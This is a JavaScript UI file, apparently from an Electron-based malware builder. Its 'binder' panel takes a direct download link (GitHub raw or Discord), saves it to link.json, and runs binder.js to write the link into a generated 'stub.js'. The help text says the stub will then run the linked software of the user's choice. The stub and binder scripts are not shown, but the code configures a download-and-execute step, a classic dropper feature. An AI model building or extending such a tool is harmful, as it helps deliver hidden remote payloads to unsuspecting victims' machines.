const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const sidebar = document.querySelector('.sidebar');
const togglebtn = document.querySelector('.toggle-btn');

togglebtn.addEventListener('click', () => {
    sidebar.classList.toggle('active');
});

const bindButton = document.getElementById('bindButton');
const resetButton = document.getElementById('resetButton');
const inputField = document.querySelector('.input-section input');

function isValidURL(string) {
    try {
        new URL(string);
        return true;
    } catch (_) {
        return false;
    }
}

function saveURL(url) {
    const jsonData = { url: url || 'none' };
    localStorage.setItem('bindFileURL', JSON.stringify(jsonData));

    const filePath = path.join(__dirname, 'link.json');
    fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), err => {
        if (err) {
            console.error('Error saving link.json:', err);
            return;
        }
        console.log('link.json has been saved!');

        exec(`node ${path.join(__dirname, '..', 'binder.js')}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing binder.js: ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`Error output from binder.js: ${stderr}`);
                return;
            }
            console.log(stdout);
            alert('URL has been saved and stub.js has been updated with the new URL!');
        });
    });
}

function deleteJSONFile() {
    const filePath = path.join(__dirname, 'link.json');
    fs.unlink(filePath, err => {
        if (err) return;
        console.log('link.json has been deleted!');
        exec(`node ${path.join(__dirname, '..', 'resetbinder.js')}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing resetLink.js: ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`Error output from resetLink.js: ${stderr}`);
                return;
            }
            console.log(stdout);
            alert('link.json has been deleted and stub.js has been reset to its original state!');
        });
    });
}

bindButton.addEventListener('click', () => {
    const inputText = inputField.value.trim();
    if (inputText === '' || isValidURL(inputText)) {
        saveURL(inputText);
        inputField.value = '';
    } else {
        alert('Please enter a valid URL');
    }
});

resetButton.addEventListener('click', () => {
    deleteJSONFile();
    localStorage.removeItem('bindFileURL');
    inputField.value = '';
});

function populateInputField() {
    const savedData = localStorage.getItem('bindFileURL');
    const savedURL = savedData ? JSON.parse(savedData).url : '';
    inputField.value = savedURL;
}

document.addEventListener('DOMContentLoaded', populateInputField);
function showHelpMessage() {
    alert('The binder is an option that will run the software or video image etc of your choice, you only need a direct link (when you click on the link, it downloads directly like github raw or discord).');
}

document.getElementById('helpButton').addEventListener('click', showHelpMessage);
